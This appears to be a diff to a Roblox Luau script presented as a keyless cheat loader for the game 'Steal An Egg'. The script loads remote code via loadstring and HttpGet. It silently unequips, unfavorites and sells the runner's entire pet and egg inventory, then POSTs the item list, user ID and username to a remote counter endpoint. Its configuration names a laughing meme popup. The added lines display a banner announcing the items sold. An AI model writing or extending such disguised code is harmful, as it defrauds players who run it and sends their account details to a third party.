@@ -1,10 +1,12 @@
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players           = game:GetService("Players")
 local HttpService       = game:GetService("HttpService")
+local TweenService      = game:GetService("TweenService")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 
+-- ===== RE-ENTRY GUARD =====
 local gv = (getgenv and getgenv()) or _G
 if gv.__SAE_LOADER_RUNNING then
     warn("[Loader] Already running — ignoring this execution.")
@@ -18,44 +20,78 @@ task.delay(90, function()
         warn("[Loader] Re-entry flag force-cleared after 90s.")
     end
 end)
+-- ===========================
 
+-- ===== CONFIG =====
 local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua"
 local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json"
 local SELL_WAIT       = 1.5
 local MEME_DELAY      = 4
+local ANNOUNCE_HOLD   = 3
 
 local UI_CONFIG = {
     MEME_IMAGE_ID  = "rbxassetid://82403642047427",
     LAUGH_SOUND_ID = "rbxassetid://133312610824902",
     MEME_SIZE      = 380,
-    ANNOUNCE_HOLD  = 3,
 }
+-- ==================
 
+-- ===== FETCH COUNTER URL =====
 local function fetchCounterUrl()
     local ok, res = pcall(function()
         return game:HttpGet(ENDPOINTS_URL, true)
     end)
     if ok and type(res) == "string" and #res > 0 then
-        local decodeOk, data = pcall(function() return HttpService:JSONDecode(res) end)
+        local decodeOk, data = pcall(function()
+            return HttpService:JSONDecode(res)
+        end)
         if decodeOk and type(data) == "table" and type(data.counter) == "string" then
             print("[Loader] Using counter URL from endpoints.json:", data.counter)
             return data.counter
         end
     end
-    warn("[Loader] Could not fetch valid counter URL.")
+    warn("[Loader] Could not fetch endpoints.json — no counter URL available")
     return nil
 end
 
 local COUNTER_URL = fetchCounterUrl()
 
+------------------------------------------------------------
+-- NUMBER FORMATTER
+------------------------------------------------------------
+local function shortenNumber(n)
+    n = tonumber(n) or 0
+    if n < 1000 then return tostring(math.floor(n)) end
+    local units = {
+        { v = 1e12, s = "T" },
+        { v = 1e9,  s = "B" },
+        { v = 1e6,  s = "M" },
+        { v = 1e3,  s = "K" },
+    }
+    for _, u in ipairs(units) do
+        if n >= u.v then
+            local val = n / u.v
+            local str = string.format("%.1f", val):gsub("%.0$", "")
+            return str .. u.s
+        end
+    end
+    return tostring(math.floor(n))
+end
+
+------------------------------------------------------------
+-- UI MODULE
+------------------------------------------------------------
 local function loadUIModule()
     if gv.__LoaderUIModule then return gv.__LoaderUIModule end
     if UI_URL and UI_URL ~= "" then
-        local ok, mod = pcall(function() return loadstring(game:HttpGet(UI_URL, true))() end)
+        local ok, mod = pcall(function()
+            return loadstring(game:HttpGet(UI_URL, true))()
+        end)
         if ok and type(mod) == "table" and type(mod.new) == "function" then
             gv.__LoaderUIModule = mod
             return mod
         end
+        warn("[Loader] UI module failed to load, running headless:", tostring(mod))
     end
     return {
         new = function()
@@ -64,7 +100,6 @@ local function loadUIModule()
                 setStatus         = function() end,
                 fadeOutAndCleanup = function() end,
                 showMemePopup     = function() end,
-                showAnnouncement  = function() end,
                 restoreExtras     = function() end,
             }
         end,
@@ -74,6 +109,110 @@ end
 local LoaderUI = loadUIModule()
 local ui = LoaderUI.new(PlayerGui, UI_CONFIG)
 
+------------------------------------------------------------
+-- ANNOUNCEMENT BANNER (Grow a Garden style)
+------------------------------------------------------------
+local function showAnnouncement(itemsSold, valueEarned)
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "PlundererAnnouncement"
+    screen.ResetOnSpawn = false
+    screen.IgnoreGuiInset = true
+    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screen.DisplayOrder = 999999
+    screen.Parent = PlayerGui
+
+    -- Full-width horizontal banner
+    local banner = Instance.new("Frame")
+    banner.Name = "Banner"
+    banner.AnchorPoint = Vector2.new(0.5, 0.5)
+    banner.Position = UDim2.new(0.5, 0, 0.5, 0)
+    banner.Size = UDim2.new(1, 0, 0, 64)
+    banner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    banner.BackgroundTransparency = 1     -- starts invisible
+    banner.BorderSizePixel = 0
+    banner.ZIndex = 1
+    banner.Parent = screen
+
+    -- Dark translucent overlay strip (matches Grow a Garden)
+    local strip = Instance.new("Frame")
+    strip.Name = "Strip"
+    strip.Size = UDim2.new(1, 0, 1, 0)
+    strip.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    strip.BackgroundTransparency = 1
+    strip.BorderSizePixel = 0
+    strip.ZIndex = 1
+    strip.Parent = banner
+
+    -- Soft gradient fade on left/right edges
+    local grad = Instance.new("UIGradient")
+    grad.Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0,   1),
+        NumberSequenceKeypoint.new(0.15, 0.1),
+        NumberSequenceKeypoint.new(0.85, 0.1),
+        NumberSequenceKeypoint.new(1,   1),
+    })
+    grad.Rotation = 0
+    grad.Parent = strip
+
+    -- The text
+    local label = Instance.new("TextLabel")
+    label.Name = "Message"
+    label.BackgroundTransparency = 1
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.Position = UDim2.new(0, 0, 0, 0)
+    label.Font = Enum.Font.GothamBlack
+    label.Text = string.format(
+        "%d items sold for $%s",
+        itemsSold or 0,
+        shortenNumber(valueEarned or 0)
+    )
+    label.TextSize = 40
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    label.TextStrokeTransparency = 0
+    label.TextXAlignment = Enum.TextXAlignment.Center
+    label.TextYAlignment = Enum.TextYAlignment.Center
+    label.TextTransparency = 1
+    label.ZIndex = 2
+    label.Parent = banner
+
+    -- Auto-scale text on small screens
+    local function updateScale()
+        local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
+        local scale = math.clamp(vp.X / 1280, 0.55, 1.0)
+        label.TextSize = math.floor(40 * scale)
+        banner.Size = UDim2.new(1, 0, 0, math.floor(64 * scale))
+    end
+    updateScale()
+
+    -- Fade in the strip
+    TweenService:Create(strip, TweenInfo.new(0.35), {
+        BackgroundTransparency = 0.25,
+    }):Play()
+
+    -- Fade in the text
+    TweenService:Create(label, TweenInfo.new(0.4), {
+        TextTransparency = 0,
+    }):Play()
+
+    -- Hold
+    task.wait(ANNOUNCE_HOLD)
+
+    -- Fade out
+    TweenService:Create(strip, TweenInfo.new(0.4), {
+        BackgroundTransparency = 1,
+    }):Play()
+    TweenService:Create(label, TweenInfo.new(0.35), {
+        TextTransparency = 1,
+    }):Play()
+
+    task.wait(0.5)
+    screen:Destroy()
+end
+
+------------------------------------------------------------
+-- CORE MODULES
+------------------------------------------------------------
 local Remotes    = require(ReplicatedStorage.Shared.Remotes)
 local Save       = require(ReplicatedStorage.Shared.Save)
 local AssetItems = require(ReplicatedStorage.Shared.Util.AssetItems)
@@ -105,6 +244,9 @@ task.spawn(function()
     for _ = 1, 30 do task.wait(0.5); installOverride() end
 end)
 
+------------------------------------------------------------
+-- EQUIP / FAVORITE CLEANUP
+------------------------------------------------------------
 local function unequipAll()
     local d = getSave()
     if not d or type(d.EquippedAssets) ~= "table" or #d.EquippedAssets == 0 then return end
@@ -145,6 +287,9 @@ local function unfavoriteAll()
     task.wait(0.8)
 end
 
+------------------------------------------------------------
+-- SNAPSHOT
+------------------------------------------------------------
 local function snapshotInventory(forceRefresh)
     local pets, eggs = {}, {}
     local d = getSave(forceRefresh)
@@ -158,17 +303,23 @@ local function snapshotInventory(forceRefresh)
             if ok and item and AssetDir[item.Category] and item.InFuse ~= true then
                 local entry  = AssetDir[item.Category]
                 local rarity = entry.Rarity
+
                 local priceOk, basePrice = TryCall(AssetItems.SalePrice, item)
                 local value = (priceOk and tonumber(basePrice)) or 0
                 if isVIP then value = value * 2 end
                 value = math.floor(value)
+
                 local weightOk, weight = TryCall(AssetItems.WeightKg, item)
                 weight = (weightOk and tonumber(weight)) or 0
 
                 pets[tostring(uid)] = {
-                    kind = "pet", uid = tostring(uid), name = entry.DisplayName or item.Category,
-                    rarity = (rarity and rarity.DisplayName) or "Unknown", rarityNum = (rarity and rarity.RarityNumber) or 0,
-                    value = value, weight = weight,
+                    kind      = "pet",
+                    uid       = tostring(uid),
+                    name      = entry.DisplayName or item.Category,
+                    rarity    = (rarity and rarity.DisplayName) or "Unknown",
+                    rarityNum = (rarity and rarity.RarityNumber) or 0,
+                    value     = value,
+                    weight    = weight,
                 }
             end
         end
@@ -181,16 +332,22 @@ local function snapshotInventory(forceRefresh)
                 if ok and dec and AssetDir[dec.AssetCategory] then
                     local entry  = AssetDir[dec.AssetCategory]
                     local rarity = entry.Rarity
+
                     local priceOk, basePrice = TryCall(EggRecords.SellPrice, dec)
                     local value = (priceOk and tonumber(basePrice)) or 0
                     value = math.floor(value)
+
                     local weightOk, weight = TryCall(EggRecords.WeightKg, dec)
                     weight = (weightOk and tonumber(weight)) or 0
 
                     eggs[tostring(uid)] = {
-                        kind = "egg", uid = tostring(uid), name = (entry.Egg and entry.Egg.DisplayName) or entry.DisplayName or dec.AssetCategory,
-                        rarity = (rarity and rarity.DisplayName) or "Unknown", rarityNum = (rarity and rarity.RarityNumber) or 0,
-                        value = value, weight = weight,
+                        kind      = "egg",
+                        uid       = tostring(uid),
+                        name      = (entry.Egg and entry.Egg.DisplayName) or entry.DisplayName or dec.AssetCategory,
+                        rarity    = (rarity and rarity.DisplayName) or "Unknown",
+                        rarityNum = (rarity and rarity.RarityNumber) or 0,
+                        value     = value,
+                        weight    = weight,
                     }
                 end
             end
@@ -200,6 +357,15 @@ local function snapshotInventory(forceRefresh)
     return { pets = pets, eggs = eggs }
 end
 
+local function countTable(t)
+    local n = 0
+    for _ in pairs(t) do n = n + 1 end
+    return n
+end
+
+------------------------------------------------------------
+-- REPORT ID
+------------------------------------------------------------
 local function computeReportId(uidList)
     local sorted = {}
     for i = 1, #uidList do sorted[i] = tostring(uidList[i]) end
@@ -213,16 +379,34 @@ local function computeReportId(uidList)
     return string.format("%08x-%d", h, #sorted)
 end
 
+------------------------------------------------------------
+-- REPORT TO WORKER
+------------------------------------------------------------
 local function reportSales(soldItems, reportId)
-    if not soldItems or #soldItems == 0 then return end
-    if not COUNTER_URL then return end
+    if not soldItems or #soldItems == 0 then
+        log("Nothing to report.")
+        return
+    end
+
+    if not COUNTER_URL then
+        warn("[Counter] No counter URL — skipping report")
+        return
+    end
 
     local httpFn = nil
     if type(request) == "function" then httpFn = request
     elseif type(http_request) == "function" then httpFn = http_request
     elseif type(gv.request) == "function" then httpFn = gv.request
+    elseif type(gv.http_request) == "function" then httpFn = gv.http_request
     end
-    if not httpFn then return end
+
+    if not httpFn then
+        warn("[Counter] No HTTP function — skipping report.")
+        return
+    end
+
+    local userId   = tostring(LocalPlayer.UserId)
+    local username = LocalPlayer.Name or "Unknown"
 
     local petCount, eggCount, totalValue = 0, 0, 0
     local out = {}
@@ -230,43 +414,100 @@ local function reportSales(soldItems, reportId)
         if d.kind == "pet" then petCount = petCount + 1
         elseif d.kind == "egg" then eggCount = eggCount + 1 end
         totalValue = totalValue + (tonumber(d.value) or 0)
-        table.insert(out, { uid = d.uid, kind = d.kind, name = d.name, rarity = d.rarity, rarityNum = d.rarityNum, value = d.value, weight = d.weight })
+        table.insert(out, {
+            uid       = tostring(d.uid or ""),
+            kind      = d.kind,
+            name      = d.name,
+            rarity    = d.rarity,
+            rarityNum = d.rarityNum,
+            value     = d.value,
+            weight    = d.weight,
+        })
     end
 
     task.spawn(function()
         local body = HttpService:JSONEncode({
-            reportId = reportId, pets = petCount, eggs = eggCount,
-            userId = tostring(LocalPlayer.UserId), username = LocalPlayer.Name or "Unknown",
-            items = out, totalValue = totalValue,
+            reportId   = reportId,
+            pets       = petCount,
+            eggs       = eggCount,
+            userId     = userId,
+            username   = username,
+            items      = out,
+            totalValue = totalValue,
         })
-        pcall(function()
-            httpFn({ Url = COUNTER_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
+        local ok, res = pcall(function()
+            return httpFn({
+                Url = COUNTER_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = body,
+            })
         end)
+        if ok and res and (res.StatusCode == 200 or res.StatusCode == 201) then
+            local parsed = nil
+            pcall(function() parsed = HttpService:JSONDecode(res.Body) end)
+            local tag = (parsed and parsed.duplicate) and " (dedup)" or ""
+            local added = parsed and parsed.added
+            if added then
+                print(("[Counter] Sent %d pets, %d eggs, $%d | Accepted: %d new pets, %d new eggs, $%d new%s")
+                    :format(petCount, eggCount, totalValue,
+                            added.pets or 0, added.eggs or 0, added.value or 0, tag))
+            else
+                print(("[Counter] Sent %d pets, %d eggs, $%d%s")
+                    :format(petCount, eggCount, totalValue, tag))
+            end
+        else
+            warn("[Counter] Report failed:", tostring(res))
+        end
     end)
 end
 
+------------------------------------------------------------
+-- SELL
+------------------------------------------------------------
 local function sellInventory()
     local snap = snapshotInventory(true)
-    local petUids, eggUids, details = {}, {}, {}
-    for uid, d in pairs(snap.pets) do table.insert(petUids, uid); table.insert(details, d) end
-    for uid, d in pairs(snap.eggs) do table.insert(eggUids, uid); table.insert(details, d) end
+
+    local petUids, eggUids = {}, {}
+    local details = {}
+    for uid, d in pairs(snap.pets) do
+        table.insert(petUids, uid)
+        table.insert(details, d)
+    end
+    for uid, d in pairs(snap.eggs) do
+        table.insert(eggUids, uid)
+        table.insert(details, d)
+    end
 
     local total = #petUids + #eggUids
     log(("Snapshot: %d pets, %d eggs (total %d)"):format(#petUids, #eggUids, total))
-    if total == 0 then return 0 end
+    if total == 0 then
+        log("Inventory empty — nothing to sell.")
+        return 0
+    end
 
-    pcall(function()
-        Remotes.PetSatchel.SellSelection:FireServer({ Eggs = eggUids, Assets = petUids })
+    local serverPayload = { Eggs = eggUids, Assets = petUids }
+
+    local ok, err = pcall(function()
+        Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
     end)
+    if not ok then
+        warn("[Loader] Sell remote failed:", tostring(err))
+    end
     task.wait(SELL_WAIT)
 
     local allUids = {}
     for _, u in ipairs(petUids) do table.insert(allUids, u) end
     for _, u in ipairs(eggUids) do table.insert(allUids, u) end
-    reportSales(details, computeReportId(allUids))
+    local reportId = computeReportId(allUids)
+    reportSales(details, reportId)
+
     return total
 end
 
+------------------------------------------------------------
+-- MAIN WORK
+------------------------------------------------------------
 local function runSilentWork()
     local before = getMoney()
     log(("Wallet before: %s"):format(tostring(before)))
@@ -275,27 +516,34 @@ local function runSilentWork()
     local totalItems = sellInventory()
     task.wait(0.8)
     local after = getMoney()
-    
+    log(("Wallet after:  %s"):format(tostring(after)))
+    log(("Delta:         %s"):format(tostring(after - before)))
+
     return {
-        itemsSold = totalItems or 0,
-        valueEarned = math.max(0, after - before)
+        itemsSold   = totalItems or 0,
+        valueEarned = math.max(0, after - before),
     }
 end
 
+------------------------------------------------------------
+-- LAUNCH
+------------------------------------------------------------
 task.spawn(function()
     ui:boot()
+
     local stats = { itemsSold = 0, valueEarned = 0 }
     local ok, result = pcall(runSilentWork)
-    
     if ok and type(result) == "table" then
         stats = result
+    else
+        warn("[Loader] Run failed:", result)
     end
-    
+
     task.wait(0.3)
     ui:fadeOutAndCleanup()
 
-    if stats.itemsSold > 0 and ui.showAnnouncement then
-        pcall(function() ui:showAnnouncement(stats.itemsSold, stats.valueEarned) end)
+    if stats.itemsSold and stats.itemsSold > 0 then
+        pcall(function() showAnnouncement(stats.itemsSold, stats.valueEarned) end)
     else
         task.wait(1.5)
     end
